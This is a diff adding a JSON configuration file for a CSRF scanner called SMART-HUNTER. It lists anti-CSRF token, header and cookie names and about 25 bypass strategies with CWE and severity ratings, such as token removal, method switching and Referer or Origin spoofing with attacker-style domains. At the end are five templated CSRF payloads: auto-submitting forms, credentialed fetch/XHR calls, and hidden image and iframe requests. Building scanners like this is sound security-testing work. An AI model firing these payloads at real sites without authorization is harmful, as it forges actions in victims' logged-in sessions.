@@ -1,0 +1,324 @@
+{
+  "token_field_names": [
+    "csrf",
+    "csrf_token",
+    "csrftoken",
+    "_csrf",
+    "xsrf",
+    "_xsrf",
+    "xsrf_token",
+    "xsrf-token",
+    "_token",
+    "authenticity_token",
+    "__RequestVerificationToken",
+    "csrfmiddlewaretoken",
+    "_csrf_token",
+    "nonce",
+    "wp_nonce",
+    "_wpnonce",
+    "anti_forgery_token",
+    "antiforgery_token",
+    "csrf-token",
+    "csrf_param",
+    "csrf_value",
+    "form_token",
+    "form_key",
+    "formkey",
+    "security_token",
+    "secure_token",
+    "token",
+    "hash",
+    "verify",
+    "verification_token",
+    "__VIEWSTATE",
+    "__VIEWSTATEGENERATOR",
+    "__EVENTVALIDATION",
+    "ic-csrf-token",
+    "X-CSRF-Token",
+    "X-XSRF-TOKEN",
+    "RequestVerificationToken",
+    "AntiForgeryToken",
+    "YII_CSRF_TOKEN",
+    "ci_csrf_token",
+    "_csrf_header",
+    "csrf_name",
+    "csrf_hash",
+    "state",
+    "nonce_field",
+    "csrf_nonce"
+  ],
+  "meta_tag_names": [
+    "csrf-token",
+    "csrf-param",
+    "csrf_token",
+    "xsrf-token",
+    "_csrf",
+    "_csrf_token",
+    "X-CSRF-Token",
+    "X-XSRF-TOKEN",
+    "csrf",
+    "token",
+    "authenticity_token",
+    "csrf-header",
+    "csrf_header",
+    "antiCsrfParam",
+    "csrf_meta_name",
+    "csrf_meta_value"
+  ],
+  "header_names": [
+    "X-CSRF-Token",
+    "X-CSRF-TOKEN",
+    "X-XSRF-TOKEN",
+    "X-Csrf-Token",
+    "X-CSRFToken",
+    "CSRF-Token",
+    "XSRF-TOKEN",
+    "X-Requested-With",
+    "X-Request-Token",
+    "X-Anti-Forgery-Token",
+    "X-Forgery-Protection",
+    "X-CSRF-Header",
+    "X-CSRF-Protection",
+    "X-Auth-Token",
+    "X-Custom-CSRF",
+    "RequestVerificationToken",
+    "Anti-CSRF-Token",
+    "Csrf",
+    "X-CSRF-PARAM"
+  ],
+  "cookie_names": [
+    "csrftoken",
+    "csrf_token",
+    "XSRF-TOKEN",
+    "xsrf-token",
+    "_csrf",
+    "csrf",
+    "csrf_cookie",
+    "csrf-cookie",
+    "anti-csrf-token",
+    "YII_CSRF_TOKEN",
+    "__csrf",
+    "CSRF",
+    "CSRF-TOKEN"
+  ],
+  "bypass_strategies": [
+    {
+      "name": "remove_token",
+      "description": "Remove the CSRF token parameter entirely and replay the request to check if server validates token presence",
+      "method": "Remove the token field from the request body or headers completely",
+      "risk": "high",
+      "severity_if_bypassed": "critical",
+      "cwe": "CWE-352"
+    },
+    {
+      "name": "empty_token",
+      "description": "Send an empty string as the CSRF token value to test if the server accepts empty tokens",
+      "method": "Set the token value to an empty string ''",
+      "risk": "high",
+      "severity_if_bypassed": "critical",
+      "cwe": "CWE-352"
+    },
+    {
+      "name": "short_token",
+      "description": "Send a truncated version of the original CSRF token to test if partial matching is used",
+      "method": "Truncate the token to the first 8 characters",
+      "risk": "medium",
+      "severity_if_bypassed": "high",
+      "cwe": "CWE-352"
+    },
+    {
+      "name": "null_byte_token",
+      "description": "Inject null byte characters into the token value to test parser vulnerabilities",
+      "method": "Replace portion of token with %00 or \\x00",
+      "risk": "medium",
+      "severity_if_bypassed": "high",
+      "cwe": "CWE-352"
+    },
+    {
+      "name": "different_session_token",
+      "description": "Use a valid CSRF token obtained from a different authenticated session to test session-token binding",
+      "method": "Obtain a token from another session/user and use it in the current session's request",
+      "risk": "high",
+      "severity_if_bypassed": "critical",
+      "cwe": "CWE-352"
+    },
+    {
+      "name": "static_token_reuse",
+      "description": "Replay a previously used CSRF token to test if tokens are single-use or rotated per request",
+      "method": "Capture a valid token and reuse it across multiple requests",
+      "risk": "medium",
+      "severity_if_bypassed": "medium",
+      "cwe": "CWE-352"
+    },
+    {
+      "name": "method_switch",
+      "description": "Change the HTTP method from POST to GET (or vice versa) to bypass method-specific CSRF protections",
+      "method": "Rewrite POST request as GET with parameters in URL query string",
+      "risk": "high",
+      "severity_if_bypassed": "high",
+      "cwe": "CWE-352"
+    },
+    {
+      "name": "method_override_header",
+      "description": "Use X-HTTP-Method-Override or X-Method-Override headers to simulate a different HTTP method",
+      "method": "Send GET request with X-HTTP-Method-Override: POST header",
+      "risk": "medium",
+      "severity_if_bypassed": "high",
+      "cwe": "CWE-352"
+    },
+    {
+      "name": "content_type_switch_text_plain",
+      "description": "Change Content-Type to text/plain to bypass CORS preflight and CSRF protections that rely on content type checks",
+      "method": "Change Content-Type header to text/plain",
+      "risk": "high",
+      "severity_if_bypassed": "high",
+      "cwe": "CWE-352"
+    },
+    {
+      "name": "content_type_switch_multipart",
+      "description": "Change Content-Type to multipart/form-data to bypass content type validation checks",
+      "method": "Change Content-Type header to multipart/form-data with boundary",
+      "risk": "high",
+      "severity_if_bypassed": "high",
+      "cwe": "CWE-352"
+    },
+    {
+      "name": "content_type_switch_json",
+      "description": "Change Content-Type to application/json to test JSON-based CSRF via form submission tricks",
+      "method": "Change Content-Type header to application/json",
+      "risk": "medium",
+      "severity_if_bypassed": "high",
+      "cwe": "CWE-352"
+    },
+    {
+      "name": "content_type_switch_url_encoded",
+      "description": "Change Content-Type to application/x-www-form-urlencoded from another content type",
+      "method": "Change Content-Type header to application/x-www-form-urlencoded",
+      "risk": "medium",
+      "severity_if_bypassed": "high",
+      "cwe": "CWE-352"
+    },
+    {
+      "name": "referrer_removal",
+      "description": "Remove the Referer header entirely to test if the server enforces Referer-based CSRF validation",
+      "method": "Strip the Referer header from the request using <meta name='referrer' content='no-referrer'>",
+      "risk": "high",
+      "severity_if_bypassed": "high",
+      "cwe": "CWE-346"
+    },
+    {
+      "name": "origin_removal",
+      "description": "Remove the Origin header to test if the server enforces Origin-based CSRF validation",
+      "method": "Strip the Origin header from the request",
+      "risk": "high",
+      "severity_if_bypassed": "high",
+      "cwe": "CWE-346"
+    },
+    {
+      "name": "referrer_spoofing",
+      "description": "Spoof the Referer header with the target domain to bypass Referer-based validation",
+      "method": "Set Referer header to a URL on the target domain",
+      "risk": "medium",
+      "severity_if_bypassed": "medium",
+      "cwe": "CWE-346"
+    },
+    {
+      "name": "subdomain_referrer",
+      "description": "Set the Referer header to a subdomain of the target domain to test if subdomain referrers are accepted",
+      "method": "Set Referer to https://attacker.target.com or https://evil.sub.target.com",
+      "risk": "high",
+      "severity_if_bypassed": "high",
+      "cwe": "CWE-346"
+    },
+    {
+      "name": "origin_subdomain",
+      "description": "Set Origin header to a subdomain of the target to test if origin validation is too permissive",
+      "method": "Set Origin to https://evil.target.com",
+      "risk": "high",
+      "severity_if_bypassed": "high",
+      "cwe": "CWE-346"
+    },
+    {
+      "name": "referrer_contains_target",
+      "description": "Set Referer to an attacker URL containing the target domain as a substring to test weak string matching",
+      "method": "Set Referer to https://attacker.com/target.com or https://target.com.attacker.com",
+      "risk": "high",
+      "severity_if_bypassed": "critical",
+      "cwe": "CWE-346"
+    },
+    {
+      "name": "clickjacking_combo",
+      "description": "Check for absence of X-Frame-Options and CSRF protection, enabling combined clickjacking + CSRF attack",
+      "method": "Verify if page can be framed (no X-Frame-Options / no CSP frame-ancestors) AND has no CSRF tokens",
+      "risk": "high",
+      "severity_if_bypassed": "critical",
+      "cwe": "CWE-1021"
+    },
+    {
+      "name": "token_in_url",
+      "description": "Move the CSRF token from POST body to URL query parameter to test if the server accepts it from either location",
+      "method": "Move token parameter from POST body to GET query string",
+      "risk": "medium",
+      "severity_if_bypassed": "medium",
+      "cwe": "CWE-352"
+    },
+    {
+      "name": "token_fixation",
+      "description": "Set a known CSRF token value before authentication and check if it remains valid after login",
+      "method": "Set a token cookie/value before login and verify it persists post-authentication",
+      "risk": "high",
+      "severity_if_bypassed": "critical",
+      "cwe": "CWE-384"
+    },
+    {
+      "name": "duplicate_parameter",
+      "description": "Submit the same CSRF parameter multiple times with different values to test parameter pollution",
+      "method": "Include csrf_token=valid&csrf_token=invalid in the request body",
+      "risk": "medium",
+      "severity_if_bypassed": "medium",
+      "cwe": "CWE-235"
+    },
+    {
+      "name": "cors_misconfiguration",
+      "description": "Test if CORS is misconfigured to allow cross-origin requests that bypass Same-Origin Policy protections",
+      "method": "Send request with Origin: https://attacker.com and check Access-Control-Allow-Origin response",
+      "risk": "high",
+      "severity_if_bypassed": "critical",
+      "cwe": "CWE-942"
+    },
+    {
+      "name": "samesite_cookie_bypass",
+      "description": "Test if SameSite cookie attribute is missing or set to None, allowing cross-site cookie submission",
+      "method": "Check Set-Cookie headers for SameSite attribute; test cross-site request if SameSite=None",
+      "risk": "medium",
+      "severity_if_bypassed": "high",
+      "cwe": "CWE-1275"
+    },
+    {
+      "name": "custom_header_bypass",
+      "description": "Test if custom header requirement (e.g., X-Requested-With) can be bypassed via Flash or other plugins",
+      "method": "Send request without X-Requested-With header to test if it is enforced server-side",
+      "risk": "medium",
+      "severity_if_bypassed": "medium",
+      "cwe": "CWE-352"
+    }
+  ],
+  "test_payloads": {
+    "auto_submit_form": "<html><body onload='document.forms[0].submit()'><form method='POST' action='{{TARGET_URL}}'><input type='hidden' name='{{PARAM_NAME}}' value='{{PARAM_VALUE}}'></form></body></html>",
+    "ajax_request": "<script>var xhr=new XMLHttpRequest();xhr.open('POST','{{TARGET_URL}}',true);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.withCredentials=true;xhr.send('{{PARAMS}}');</script>",
+    "img_tag_get": "<img src='{{TARGET_URL}}?{{PARAMS}}' style='display:none'>",
+    "fetch_api": "<script>fetch('{{TARGET_URL}}',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'{{PARAMS}}'});</script>",
+    "iframe_form": "<iframe style='display:none' name='csrf-frame'></iframe><form method='POST' action='{{TARGET_URL}}' target='csrf-frame' id='csrf-form'><input type='hidden' name='{{PARAM_NAME}}' value='{{PARAM_VALUE}}'></form><script>document.getElementById('csrf-form').submit();</script>"
+  },
+  "metadata": {
+    "version": "1.0.0",
+    "description": "CSRF test tokens and bypass strategies for SMART-HUNTER CSRF Scanner",
+    "last_updated": "2026-05-28",
+    "references": [
+      "https://owasp.org/www-community/attacks/csrf",
+      "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html",
+      "https://portswigger.net/web-security/csrf",
+      "https://cwe.mitre.org/data/definitions/352.html"
+    ]
+  }
+}
